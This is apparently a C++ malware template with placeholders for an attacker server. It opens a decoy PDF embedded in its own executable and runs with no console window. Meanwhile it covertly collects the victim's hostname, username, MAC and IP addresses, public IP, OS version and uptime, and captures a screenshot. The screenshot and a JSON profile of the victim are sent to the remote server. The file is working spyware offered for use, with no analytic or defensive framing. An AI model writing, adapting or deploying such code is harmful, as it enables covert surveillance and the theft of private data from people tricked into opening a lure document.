#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <ctime>
#include <cstring>
#include <cstdlib>

#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #include <iphlpapi.h>
    #include <ws2tcpip.h>
    #include <lmcons.h>
    #include <gdiplus.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "gdiplus.lib")
    #pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
    using namespace Gdiplus;
    using Gdiplus::Status;
    using Gdiplus::Ok;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif

std::string SERVER_IP = "{{SERVER_IP}}";
int SERVER_PORT = {{SERVER_PORT}};
std::string PDF_MARKER = "{{PDF_MARKER}}"; 
bool HAS_PDF = {{HAS_PDF}};

std::string upload_screenshot(const std::string& filepath, const std::string& source_ip, const std::string& hostname, const std::string& server_ip, int server_port) {
#ifdef _WIN32
    try {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return "";

        // 设置超时
        DWORD timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(server_port);
        server.sin_addr.s_addr = inet_addr(server_ip.c_str());

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
            closesocket(sock);
            return "";
        }

        std::ifstream file(filepath, std::ios::binary);
        if (!file) {
            closesocket(sock);
            return "";
        }

        file.seekg(0, std::ios::end);
        size_t filesize = file.tellg();
        file.seekg(0, std::ios::beg);

        if (filesize == 0 || filesize > 10485760) { // 最大10MB
            file.close();
            closesocket(sock);
            return "";
        }

        std::vector<char> buffer(filesize);
        file.read(buffer.data(), filesize);
        file.close();

        std::ostringstream request;
        request << "POST /upload_screenshot/" << source_ip << "/" << hostname << " HTTP/1.1\r\n";
        request << "Host: " << server_ip << ":" << server_port << "\r\n";
        request << "Content-Type: image/jpeg\r\n";
        request << "Content-Length: " << filesize << "\r\n";
        request << "Connection: close\r\n\r\n";

        std::string req_str = request.str();
        int sent = send(sock, req_str.c_str(), req_str.length(), 0);
        if (sent <= 0) {
            closesocket(sock);
            return "";
        }

        sent = send(sock, buffer.data(), filesize, 0);
        if (sent <= 0) {
            closesocket(sock);
            return "";
        }

        // 接收响应
        std::string response;
        char recv_buf[4096];
        int bytes;
        while ((bytes = recv(sock, recv_buf, sizeof(recv_buf) - 1, 0)) > 0) {
            recv_buf[bytes] = '\0';
            response += recv_buf;
            if (response.find("\r\n\r\n") != std::string::npos) break;
        }

        closesocket(sock);

        // 解析JSON响应
        size_t filename_pos = response.find("\"filename\":\"");
        if (filename_pos != std::string::npos) {
            filename_pos += 12;
            size_t end_pos = response.find("\"", filename_pos);
            if (end_pos != std::string::npos) {
                return response.substr(filename_pos, end_pos - filename_pos);
            }
        }
    } catch (...) {
        return "";
    }
#endif
    return "";
} 

std::string json_escape(const std::string& input) {
    std::ostringstream ss;
    for (auto c : input) {
        switch (c) {
            case '"': ss << "\\\""; break;
            case '\\': ss << "\\\\"; break;
            case '\b': ss << "\\b"; break;
            case '\f': ss << "\\f"; break;
            case '\n': ss << "\\n"; break;
            case '\r': ss << "\\r"; break;
            case '\t': ss << "\\t"; break;
            default:
                if ('\x00' <= c && c <= '\x1f') {
                } else {
                    ss << c;
                }
        }
    }
    return ss.str();
}

std::string get_hostname() {
    std::string hostname = "Unknown";
#ifdef _WIN32
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        hostname = std::string(buffer);
    }
#endif
    return hostname;
}

std::string get_username() {
#ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) return std::string(username);
#endif
    return "Unknown";
}

std::string get_os_version() {
#ifdef _WIN32
    std::string version = "Windows";
    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    
    typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (RtlGetVersion(&rovi) == 0) {
                char buf[64];
                sprintf(buf, "Windows %lu.%lu Build %lu", rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
                version = buf;
            }
        }
    }
    return version;
#endif
    return "Unknown";
}

std::string get_uptime() {
    long uptime_seconds = 0;
#ifdef _WIN32
    uptime_seconds = GetTickCount() / 1000;
#endif
    long days = uptime_seconds / 86400;
    long hours = (uptime_seconds % 86400) / 3600;
    long minutes = (uptime_seconds % 3600) / 60;
    char buf[64];
    sprintf(buf, "%ld days, %ldh %ldm", days, hours, minutes);
    return std::string(buf);
}

std::string get_network_info() {
    std::string info = "";
#ifdef _WIN32
    ULONG outBufLen = 15000;
    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
    
    if (pAdapterInfo == NULL) return "Alloc Error";

    if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
        if (pAdapterInfo == NULL) return "Alloc Error";
    }

    if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            // 收集 IP
            std::string ip_list = "";
            IP_ADDR_STRING *pIpAddrString = &(pAdapter->IpAddressList);
            while (pIpAddrString) {
                std::string ip = pIpAddrString->IpAddress.String;
                if (ip != "0.0.0.0" && ip != "127.0.0.1") {
                    if (!ip_list.empty()) ip_list += ", ";
                    ip_list += ip;
                }
                pIpAddrString = pIpAddrString->Next;
            }

            if (!ip_list.empty()) {
                char mac_buf[18];
                sprintf(mac_buf, "%02X:%02X:%02X:%02X:%02X:%02X",
                    pAdapter->Address[0], pAdapter->Address[1],
                    pAdapter->Address[2], pAdapter->Address[3],
                    pAdapter->Address[4], pAdapter->Address[5]);
                
                if (!info.empty()) info += " | ";
                info += "[" + std::string(mac_buf) + "] " + ip_list;
            }
            pAdapter = pAdapter->Next;
        }
    }
    if (pAdapterInfo) free(pAdapterInfo);
#endif
    return info.empty() ? "No Active Network" : info;
}

std::string get_public_ip_info() {
    std::string result = "N/A";
#ifdef _WIN32
    const char* host = "cip.cc";
    const char* port = "80";
    
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port, &hints, &res) == 0) {
        SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (sock != INVALID_SOCKET) {
            DWORD timeout = 3000;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

            if (connect(sock, res->ai_addr, (int)res->ai_addrlen) != SOCKET_ERROR) {
                std::string req = "GET / HTTP/1.1\r\nHost: cip.cc\r\nUser-Agent: curl/7.68.0\r\nConnection: close\r\n\r\n";
                send(sock, req.c_str(), req.length(), 0);

                std::string response = "";
                char buffer[4096];
                int bytes;
                do {
                    bytes = recv(sock, buffer, 4095, 0);
                    if (bytes > 0) {
                        buffer[bytes] = '\0';
                        response += buffer;
                    }
                } while (bytes > 0);

                size_t body_pos = response.find("\r\n\r\n");
                if (body_pos != std::string::npos) {
                    result = response.substr(body_pos + 4);
                }
            }
            closesocket(sock);
        }
        freeaddrinfo(res);
    }
#endif
    return result;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
#ifdef _WIN32
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
#endif
    return -1;
}

std::string capture_screenshot() {
#ifdef _WIN32
    try {
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Status status = GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        
        if (status != Ok) {
            return "Screenshot-Failed";
        }
        
        HDC hdcScreen = GetDC(NULL);
        if (!hdcScreen) {
            GdiplusShutdown(gdiplusToken);
            return "Screenshot-Failed";
        }
        
        HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
        if (!hdcMemDC) {
            ReleaseDC(NULL, hdcScreen);
            GdiplusShutdown(gdiplusToken);
            return "Screenshot-Failed";
        }
        
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hbmScreen) {
            DeleteDC(hdcMemDC);
            ReleaseDC(NULL, hdcScreen);
            GdiplusShutdown(gdiplusToken);
            return "Screenshot-Failed";
        }
        
        SelectObject(hdcMemDC, hbmScreen);
        BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
        
        Bitmap* bitmap = new Bitmap(hbmScreen, NULL);
        if (!bitmap) {
            DeleteObject(hbmScreen);
            DeleteDC(hdcMemDC);
            ReleaseDC(NULL, hdcScreen);
            GdiplusShutdown(gdiplusToken);
            return "Screenshot-Failed";
        }
        
        CLSID clsid;
        if (GetEncoderClsid(L"image/jpeg", &clsid) < 0) {
            delete bitmap;
            DeleteObject(hbmScreen);
            DeleteDC(hdcMemDC);
            ReleaseDC(NULL, hdcScreen);
            GdiplusShutdown(gdiplusToken);
            return "Screenshot-Failed";
        }
        
        char temp_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        
        time_t now = time(0);
        char filename[MAX_PATH];
        sprintf(filename, "%sscreen_%ld.jpg", temp_path, now);
        
        wchar_t wfilename[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, filename, -1, wfilename, MAX_PATH);
        
        Status saveStatus = bitmap->Save(wfilename, &clsid, NULL);
        
        delete bitmap;
        DeleteObject(hbmScreen);
        DeleteDC(hdcMemDC);
        ReleaseDC(NULL, hdcScreen);
        GdiplusShutdown(gdiplusToken);
        
        if (saveStatus != Ok) {
            return "Screenshot-Failed";
        }
        
        return std::string(filename);
    } catch (...) {
        return "Screenshot-Error";
    }
#endif
    return "N/A";
}

void check_and_open_pdf(const char* exe_path) {
#ifdef _WIN32
    std::ifstream self(exe_path, std::ios::binary | std::ios::ate); 
    if (!self.is_open()) return;

    std::streamsize size = self.tellg();
    self.seekg(0, std::ios::beg);

    std::vector<char> buffer(size);
    if (!self.read(buffer.data(), size)) return;
    self.close();

    std::string marker_str = PDF_MARKER;
    auto it = std::find_end(buffer.begin(), buffer.end(), marker_str.begin(), marker_str.end());

    if (it != buffer.end()) {
        size_t start = std::distance(buffer.begin(), it) + marker_str.length();
        if (start < buffer.size()) {
            char temp_path[MAX_PATH];
            GetTempPathA(MAX_PATH, temp_path);
            std::string pdf_path = std::string(temp_path) + "document.pdf";
            
            std::ofstream pdf_file(pdf_path, std::ios::binary);
            pdf_file.write(buffer.data() + start, buffer.size() - start);
            pdf_file.close();
            
            ShellExecuteA(NULL, "open", pdf_path.c_str(), NULL, NULL, SW_SHOW);
        }
    }
#endif
}

int main(int argc, char* argv[]) {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    if (HAS_PDF) check_and_open_pdf(argv[0]);
#endif

    std::string hostname = get_hostname();
    std::string username = get_username();
    std::string uptime = get_uptime();
    std::string net_info = get_network_info();
    std::string pub_info = get_public_ip_info();
    std::string os_version = get_os_version();
    std::string screenshot_path = capture_screenshot();

    std::string first_mac = "Unknown";
    size_t mac_end = net_info.find("]");
    if (mac_end != std::string::npos) first_mac = net_info.substr(1, mac_end - 1);

    // 获取来源IP（从公网IP信息中提取）
    std::string source_ip = "Unknown";
    if (pub_info.find("IP\t: ") != std::string::npos) {
        size_t start = pub_info.find("IP\t: ") + 5;
        size_t end = pub_info.find("\n", start);
        if (end != std::string::npos) {
            source_ip = pub_info.substr(start, end - start);
        }
    }
    
    // 上传截图，使用IP+主机名
    std::string screenshot_filename = "";
    if (screenshot_path != "N/A" && screenshot_path != "Screenshot-Failed" && screenshot_path != "Screenshot-Error") {
        // 尝试上传截图，使用IP和主机名作为参数
        screenshot_filename = upload_screenshot(screenshot_path, source_ip, hostname, SERVER_IP, 8080);
    }

    std::string json = "{";
    json += "\"主机名\": \"" + json_escape(hostname) + "\",";
    json += "\"用户名\": \"" + json_escape(username) + "\",";
    json += "\"MAC地址\": \"" + json_escape(first_mac) + "\",";
    json += "\"内网IP\": \"" + json_escape(net_info) + "\",";
    json += "\"公网IP\": \"" + json_escape(pub_info) + "\","; 
    json += "\"系统版本\": \"" + json_escape(os_version) + "\",";
    json += "\"运行时间\": \"" + json_escape(uptime) + "\",";
    json += "\"截图路径\": \"" + json_escape(screenshot_path) + "\",";
    json += "\"截图文件\": \"" + json_escape(screenshot_filename) + "\"";
    json += "}";

#ifdef _WIN32
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
#else
    int sock = socket(AF_INET, SOCK_STREAM, 0);
#endif

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
#ifdef _WIN32
    server.sin_addr.s_addr = inet_addr(SERVER_IP.c_str());
#else
    inet_pton(AF_INET, SERVER_IP.c_str(), &server.sin_addr);
#endif

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
        send(sock, json.c_str(), json.length(), 0);
    }

#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif

    return 0;
}